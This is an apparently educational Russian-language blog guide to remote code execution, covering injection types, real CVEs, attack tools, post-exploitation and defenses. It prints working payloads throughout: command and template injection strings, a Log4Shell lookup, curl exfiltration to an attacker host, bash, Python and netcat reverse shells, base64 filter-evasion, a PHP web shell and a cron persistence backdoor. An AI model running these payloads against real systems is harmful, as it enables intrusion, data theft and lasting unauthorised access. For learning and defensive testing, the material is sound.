---
title: "RCE (Remote Code Execution): Краткое руководство"
description: Базовая информация о RCE и где практиковаться
date: 2025-11-10
category: Уязвимости
author: veilosophy
---
## 1. Введение и Концептуальный Аппарат RCE

### 1.1. Определение RCE как Критической Уязвимости

**Удаленное выполнение кода (Remote Code Execution, RCE)** представляет собой класс критических уязвимостей безопасности, позволяющих злоумышленнику выполнять произвольные команды или код на удаленной вычислительной системе, на которой запущено уязвимое приложение. Успешная эксплуатация RCE-уязвимости фактически предоставляет атакующему полный контроль над скомпрометированным процессом и, в зависимости от его привилегий, над всей операционной системой. В системе оценки уязвимостей CVSS (Common Vulnerability Scoring System) RCE-уязвимости часто получают наивысшие баллы (9.0–10.0), что подчеркивает их критичность.

### 1.2. Фундаментальный Принцип: Неспособность Приложения Отличить Данные от Исполняемого Кода

Корневая причина большинства RCE-уязвимостей кроется в нарушении принципа строгого разделения **данных** и **управляющих инструкций (кода)**. Уязвимость возникает, когда приложение обрабатывает внешние, невалидированные или несанитизированные пользовательские данные таким образом, что они интерпретируются как часть исполняемого кода или команды операционной системы.

Этот фундаментальный сбой может быть вызван следующими техническими ошибками:
1.  **Небезопасное использование функций ОС:** Передача нефильтрованного пользовательского ввода в функции, предназначенные для выполнения команд операционной системы (например, `system()`, `exec()`, `shell_exec()` в PHP или `Runtime.exec()` в Java).
2.  **Небезопасная десериализация:** Восстановление объектов из сериализованных данных, контролируемых злоумышленником, что приводит к выполнению кода через "гаджет-цепочки" (gadget chains).
3.  **Небезопасная обработка шаблонов:** Использование пользовательского ввода в контексте шаблонизатора, который позволяет вызывать функции языка программирования на стороне сервера.

### 1.3. Последствия Успешной RCE-Атаки

Последствия успешной RCE-атаки носят катастрофический характер и могут включать:
*   **Полная компрометация системы:** Получение доступа к файловой системе, базам данных и внутренним сетям.
*   **Установка бэкдоров и вредоносного ПО:** Развертывание программ-вымогателей (ransomware), криптомайнеров или постоянных механизмов доступа.
*   **Кража конфиденциальных данных:** Эксфильтрация учетных данных, персональных данных пользователей (PII) и коммерческой тайны.
*   **Нарушение целостности и доступности:** Изменение или уничтожение данных, а также использование скомпрометированной системы для проведения дальнейших атак (например, DDoS).

---

## 2. Классификация и Векторы Атак RCE

RCE-уязвимости подразделяются на несколько основных категорий в зависимости от механизма, который позволяет внедрить и выполнить код.

### 2.1. Command Injection (Инъекция Команд ОС)

**Механизм эксплуатации:** Злоумышленник внедряет синтаксические разделители команд операционной системы (например, `;`, `&`, `|`, `&&`, `||`) в поле ввода, которое затем передается в функцию выполнения команд ОС. Это позволяет выполнить произвольную команду после или вместо исходной команды приложения.

**Технические детали:**
В языках, таких как PHP, Python или Java, функции, взаимодействующие с системной оболочкой, являются основной точкой отказа.

| Язык | Уязвимая функция | Пример уязвимого кода (PHP) | Полезная нагрузка (Payload) |
| :--- | :--- | :--- | :--- |
| PHP | `system()`, `exec()`, `shell_exec()` | `system("ping -c 4 " . $_GET['host']);` | `127.0.0.1; cat /etc/passwd` |
| Python | `os.system()`, `subprocess.run(shell=True)` | `os.system("ls " + user_input)` | `.; whoami` |

**Пример полезной нагрузки (Linux):**
Для последовательного выполнения команд:
`127.0.0.1 && whoami` (выполнит `whoami`, только если `ping` успешен)
`127.0.0.1 | ls -la` (перенаправит вывод `ping` в `ls`, но `ls` выполнится)

### 2.2. Code Injection (Инъекция Кода Приложения)

**Механизм эксплуатации:** Злоумышленник внедряет код, который выполняется интерпретатором самого приложения (например, PHP, Python, JavaScript), а не системной оболочкой. Это происходит через функции, которые динамически оценивают строки как код.

**Технические детали:**
Ключевыми функциями являются `eval()` в PHP/JavaScript, `exec()`/`eval()` в Python.

**Пример уязвимого кода (PHP):**
```php
<?php
$myvar = $_GET['arg'];
eval("\$result = $myvar;"); // Оценка строки как PHP-кода
?>
```

**Полезная нагрузка (PHP):**
`arg=phpinfo()`
`arg=system('whoami')`

### 2.3. Deserialization (Уязвимость Десериализации)

**Механизм эксплуатации:** Десериализация — это процесс преобразования потока байтов (сериализованных данных) обратно в объектную структуру в памяти. Уязвимость возникает, когда приложение десериализует данные, контролируемые злоумышленником, и в процессе восстановления объекта вызываются нежелательные методы (например, магические методы в PHP или `readObject()` в Java), которые, в свою очередь, запускают цепочку вызовов (gadget chain), приводящую к RCE.

**Технические детали (Java):**
В Java, если в classpath присутствуют уязвимые библиотеки (например, Apache Commons Collections), злоумышленник может создать специальный сериализованный объект, который при десериализации использует методы этих библиотек для выполнения произвольной команды. Инструмент **ysoserial** используется для генерации таких полезных нагрузок.

### 2.4. SSTI (Server-Side Template Injection)

**Механизм эксплуатации:** Уязвимость возникает, когда пользовательский ввод встраивается в шаблон на стороне сервера, который затем обрабатывается шаблонизатором (например, Jinja2, Twig, Freemarker). Если шаблонизатор не настроен на безопасный режим, злоумышленник может использовать синтаксис шаблона для доступа к внутренним объектам, вызова функций и, в конечном итоге, выполнения кода.

**Технические детали (Jinja2/Python):**
В Jinja2 можно получить доступ к базовому классу `Object` и его подклассам, что позволяет вызывать функции операционной системы.

**Полезная нагрузка для RCE в Jinja2 (Python):**
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[400]('ls -la', shell=True, stdout=-1).communicate() }}
```
*   `''.__class__.__mro__[1]` — получает базовый класс `object`.
*   `__subclasses__()` — перечисляет все классы, наследующие от `object`.
*   `[400]` (индекс может меняться) — находит класс `subprocess.Popen` или аналогичный.
*   `('ls -la', shell=True, stdout=-1).communicate()` — выполняет команду ОС.

**Полезная нагрузка для RCE в Twig (PHP):**
```twig
{{ _self.env.execute('id') }}
```
*   `_self.env` — доступ к объекту среды Twig.
*   `execute('id')` — вызов функции выполнения команды (если разрешено).

---

## 3. Реальные Инциденты и CVE

Анализ реальных инцидентов демонстрирует разрушительный потенциал RCE-уязвимостей.

### 3.1. Log4Shell (CVE-2021-44228)

| Аспект | Технические детали |
| :--- | :--- |
| **Уязвимость** | Критическая RCE в библиотеке логирования Apache Log4j 2 (версии 2.0-beta9 до 2.14.1). |
| **Механизм** | Уязвимость связана с функцией **JNDI Lookup** (Java Naming and Directory Interface). Log4j 2 по умолчанию обрабатывал строки вида `${jndi:ldap://[attacker_server]/a}`. |
| **Эксплуатация** | Злоумышленник отправлял строку, содержащую JNDI-ссылку, которая логировалась приложением. JNDI-интерфейс заставлял уязвимое приложение подключиться к контролируемому атакующим LDAP-серверу. LDAP-сервер возвращал ссылку на удаленный Java-класс (`.class` файл), который загружался и выполнялся JVM уязвимого приложения, приводя к RCE. |
| **Полезная нагрузка** | `${jndi:ldap://[IP_Атакующего]:1389/Exploit}` |

### 3.2. PHP-CGI Argument Injection (CVE-2024-4577)

| Аспект | Технические детали |
| :--- | :--- |
| **Уязвимость** | RCE в PHP, затрагивающая установки, использующие PHP в режиме CGI на Windows (особенно XAMPP), в версиях 8.1.* до 8.1.29, 8.2.* до 8.2.20 и 8.3.* до 8.3.8. |
| **Механизм** | Уязвимость обхода защиты от CVE-2012-1823. В Windows, при использовании PHP-CGI, интерпретатор PHP парсит аргументы командной строки. Некорректная обработка последовательности символов (например, символов, отличных от ASCII) позволяла злоумышленнику внедрить аргументы командной строки (`-c`, `-n`) в интерпретатор PHP через URI-путь, даже если он не существовал [6]. |
| **Эксплуатация** | Атакующий использовал последовательность символов, которая в Windows-кодировке преобразовывалась в аргумент `-s` (для отображения исходного кода) или `-d auto_prepend_file=php://input` (для RCE). |
| **Полезная нагрузка** | Внедрение аргумента `-d` для выполнения произвольного PHP-кода: `/?%ADd+auto_prepend_file=php://input` с последующей отправкой PHP-кода в теле POST-запроса. |

### 3.3. Уязвимости Десериализации в Java (WebLogic, JBoss)

Уязвимости десериализации в Java, такие как те, что были обнаружены в Oracle WebLogic Server (например, **CVE-2018-2628**) и JBoss Application Server, часто основывались на наличии в classpath библиотеки **Apache Commons Collections** [7].

**Технический принцип:**
1.  **ysoserial** генерирует сериализованный объект, содержащий цепочку вызовов (например, `CommonsCollections1` гаджет-цепочка).
2.  Эта цепочка использует методы `Transformer` для построения и выполнения команды ОС (например, `Runtime.getRuntime().exec("cmd")`).
3.  Злоумышленник отправляет этот сериализованный объект в уязвимую точку (например, HTTP-заголовок `Cookie` или тело запроса), где происходит его десериализация.
4.  В процессе десериализации вызывается метод `readObject()`, который запускает гаджет-цепочку, приводя к RCE.

---

## 4. Инструменты для Обнаружения и Эксплуатации

Профессиональные инструменты являются неотъемлемой частью процесса тестирования на проникновение и анализа RCE-уязвимостей.

| Инструмент | Назначение | Продвинутое Использование |
| :--- | :--- | :--- |
| **Burp Suite** | Перехват, анализ и модификация HTTP-запросов. Основной инструмент для ручного и полуавтоматического тестирования веб-приложений. | **Intruder:** Автоматизация перебора полезных нагрузок для Command Injection и SSTI. **Collaborator:** Обнаружение Blind RCE и SSTI через Out-of-Band (OOB) взаимодействие (например, DNS-запросы или HTTP-запросы). |
| **Metasploit Framework** | Разработка, тестирование и выполнение эксплойтов. Содержит обширную базу модулей для RCE-уязвимостей. | **Exploit Modules:** Использование готовых эксплойтов для конкретных CVE (например, Log4Shell). **Payloads (Meterpreter):** Генерация продвинутых полезных нагрузок для получения стабильного Reverse Shell и пост-эксплуатации. |
| **Commix** | Автоматизированный инструмент для обнаружения и эксплуатации уязвимостей Command Injection. | **Blind RCE:** Автоматическое обнаружение слепой инъекции команд с использованием техник задержки (time-based) или OOB. **Получение Shell:** Автоматическая генерация и доставка полезных нагрузок для получения интерактивной оболочки. |
| **ysoserial** | Инструмент для генерации сериализованных полезных нагрузок (gadget chains) для эксплуатации уязвимостей Java Deserialization. | **Custom Chains:** Создание собственных гаджет-цепочек для обхода фильтров или эксплуатации менее распространенных библиотек. **Payload Selection:** Выбор оптимальной цепочки (например, `CommonsCollections`, `Javassist`, `JBossInterceptors`) в зависимости от classpath целевого приложения. |

---

## 5. Продвинутые Техники Эксплуатации

### 5.1. Blind RCE (Слепое Выполнение Кода)

**Определение:** Blind RCE возникает, когда команда выполняется на сервере, но результат ее выполнения не возвращается напрямую атакующему.

**Механизм эксплуатации:** Для подтверждения и эксфильтрации данных используются методы Out-of-Band (OOB):
1.  **Time-Based (по времени):** Использование команды `sleep` или `ping -c 10 127.0.0.1` для вызова задержки. Если ответ сервера задерживается, выполнение команды подтверждено.
    *   **Payload (Linux):** `127.0.0.1; if [ $(whoami) = 'root' ]; then sleep 5; fi`
2.  **Out-of-Band (OOB) с использованием DNS/HTTP:** Выполнение команды, которая заставляет целевую систему отправить запрос на контролируемый атакующим сервер (например, Burp Collaborator или собственный DNS-сервер).
    *   **Payload (Linux):** `127.0.0.1; curl http://[attacker_server]/$(whoami)`
    *   **Payload (DNS Exfiltration):** `127.0.0.1; curl http://$(whoami).exfil.attacker.com`

### 5.2. Получение Reverse Shell

После подтверждения RCE, следующая цель — получение стабильной, интерактивной оболочки (shell). **Reverse Shell** является предпочтительным методом, так как он обходит ограничения исходящих фаерволов, заставляя целевую систему инициировать соединение с атакующим.

**Примеры полезных нагрузок Reverse Shell:**

| Метод | Полезная нагрузка (Payload) | Примечание |
| :--- | :--- | :--- |
| **Bash** | `bash -i >& /dev/tcp/[IP]/[PORT] 0>&1` | Классический и надежный метод для большинства Linux-систем. |
| **Python** | `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]", [PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` | Использует встроенные библиотеки, часто доступен. |
| **Netcat (nc)** | `nc -e /bin/bash [IP] [PORT]` | Требует версии Netcat с опцией `-e` (не всегда доступна). |
| **Netcat (без -e)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f` | Более универсальный, использует именованный канал (FIFO). |

### 5.3. Обход Фильтров (WAF/IDS Bypass)

**Web Application Firewalls (WAF)** и **Intrusion Detection Systems (IDS)** пытаются блокировать известные RCE-полезные нагрузки. Обход этих систем требует обфускации и использования альтернативного синтаксиса.

| Техника Обхода | Описание | Пример (обход `cat /etc/passwd`) |
| :--- | :--- | :--- |
| **Конкатенация строк** | Разбиение команды на части и их объединение с помощью переменных или синтаксиса оболочки. | `a=c;b=at; $a$b /etc/passwd` |
| **Обратные кавычки** | Использование обратных кавычек (``) для выполнения команды внутри другой команды. | ``cat`/etc/passwd`` |
| **Переменные окружения** | Использование переменных окружения для хранения частей команды. | `echo $PATH | cut -c1-3` (для обхода фильтра на `cat`) |
| **Шестнадцатеричное/ASCII кодирование** | Кодирование команды и ее последующее декодирование и выполнение (например, с помощью `echo` и `base64 -d`). | `echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash` |
| **Альтернативные разделители** | Использование `\n` (новая строка), `%0a` (URL-кодировка новой строки) или `)` для разделения команд. | `127.0.0.1%0acat /etc/passwd` |

### 5.4. RCE через Загрузку Файлов

Если приложение позволяет загружать файлы без строгой проверки их содержимого и расширения, злоумышленник может загрузить файл, содержащий исполняемый код (например, PHP-шелл или JSP-шелл), и затем получить к нему доступ через веб-сервер.

**Механизм:**
1.  Загрузка файла с расширением, которое будет выполнено сервером (например, `shell.php`).
2.  Содержимое файла: `<?php system($_GET['cmd']); ?>`
3.  Доступ к файлу: `http://target.com/uploads/shell.php?cmd=whoami`

**Техники обхода проверки расширения:**
*   **Null Byte Injection:** Использование `%00` для обрезки строки: `shell.php%00.jpg`.
*   **Double Extension:** Использование разрешенного расширения после запрещенного: `shell.php.jpg`.
*   **Case Sensitivity:** Использование `shell.PhP` для обхода фильтров, чувствительных к регистру.

---

## 6. Post-Exploitation (Пост-Эксплуатация)

После получения RCE и Reverse Shell начинается фаза пост-эксплуатации, направленная на повышение привилегий и закрепление в системе.

### 6.1. Повышение Привилегий (Privilege Escalation)

Цель — переход от низкопривилегированного пользователя (например, `www-data`) к пользователю с более высокими правами (например, `root` или `Administrator`).

**Техники:**
*   **Поиск SUID/SGID бинарных файлов:** Поиск файлов, которые выполняются с правами владельца, а не текущего пользователя.
    *   `find / -perm -4000 2>/dev/null`
*   **Уязвимости ядра:** Использование известных уязвимостей в ядре ОС для получения root-доступа.
*   **Неправильные разрешения файлов:** Поиск файлов конфигурации или скриптов, доступных для записи, которые выполняются с высокими привилегиями.
*   **Использование `sudo -l`:** Проверка, какие команды текущий пользователь может выполнять с правами `sudo` без пароля.

### 6.2. Закрепление в Системе (Persistence)

Создание механизмов, позволяющих сохранить доступ к системе даже после перезагрузки или исправления исходной уязвимости.

**Техники:**
*   **Cron Jobs:** Добавление задания в планировщик, которое периодически запускает Reverse Shell.
    *   `echo "* * * * * root /bin/bash -i >& /dev/tcp/[IP]/[PORT] 0>&1" >> /etc/crontab`
*   **SSH Keys:** Добавление публичного ключа атакующего в `~/.ssh/authorized_keys`.
*   **Backdoors:** Установка скрытого бэкдора в системные службы или веб-приложения.

### 6.3. Сбор Информации (Information Gathering)

Сбор данных о системе, сети и пользователях для планирования дальнейших действий.

**Ключевые команды:**
*   **Система:** `uname -a`, `cat /etc/issue`, `cat /etc/os-release`
*   **Сеть:** `ip a`, `netstat -tuln`, `cat /etc/resolv.conf`
*   **Пользователи:** `whoami`, `cat /etc/passwd`, `cat /etc/shadow` (если есть права)
*   **Конфигурация веб-сервера:** Поиск файлов конфигурации (например, `/etc/apache2/apache2.conf`, `/var/www/html/config.php`).

---

## 7. Защита от RCE

Эффективная защита от RCE требует многоуровневого подхода, основанного на принципе наименьших привилегий и строгой валидации ввода.

### 7.1. Валидация и Санитизация Ввода

**Ключевой принцип:** Никогда не доверять пользовательскому вводу.

*   **Whitelisting (Белый список):** Разрешать только строго определенный набор символов, форматов или значений. Это наиболее надежный метод.
*   **Blacklisting (Черный список):** Запрет известных опасных символов (`;`, `|`, `&`, `$`, `\`, `\n`). Этот метод ненадежен из-за возможности обхода.
*   **Контекстно-зависимое экранирование:** Экранирование специальных символов, если ввод должен быть использован в команде ОС. Использовать функции, которые автоматически экранируют ввод (например, `escapeshellarg()` в PHP).

### 7.2. Безопасная Десериализация

*   **Избегать десериализации:** По возможности, использовать безопасные форматы обмена данными, такие как JSON или XML, вместо нативных механизмов сериализации.
*   **Strict Type Checking:** Если десериализация необходима, использовать механизмы, которые ограничивают типы объектов, которые могут быть десериализованы (например, `ObjectInputFilter` в Java).
*   **Мониторинг и патчинг библиотек:** Регулярно обновлять все сторонние библиотеки и удалять неиспользуемые, чтобы избежать наличия уязвимых гаджет-цепочек (например, `Apache Commons Collections`).

### 7.3. Изоляция и Контейнеризация

*   **Принцип наименьших привилегий:** Запускать веб-приложения и связанные с ними процессы под учетными записями с минимально необходимыми правами (например, `www-data`).
*   **Контейнеризация (Docker, Kubernetes):** Использование контейнеров для изоляции приложений. В случае RCE, злоумышленник получает контроль только над контейнером, а не над хост-системой.
*   **Chroot Jails:** Ограничение доступа процесса к определенной части файловой системы.

### 7.4. Мониторинг и Обнаружение

*   **WAF и IDS:** Развертывание WAF для фильтрации вредоносных запросов и IDS для обнаружения подозрительной активности (например, попыток выполнения команд, кодированных полезных нагрузок).
*   **Мониторинг выполнения команд:** Использование систем мониторинга для отслеживания необычных вызовов системных команд из процесса веб-сервера (например, вызов `nc`, `bash`, `python` из процесса `httpd`).
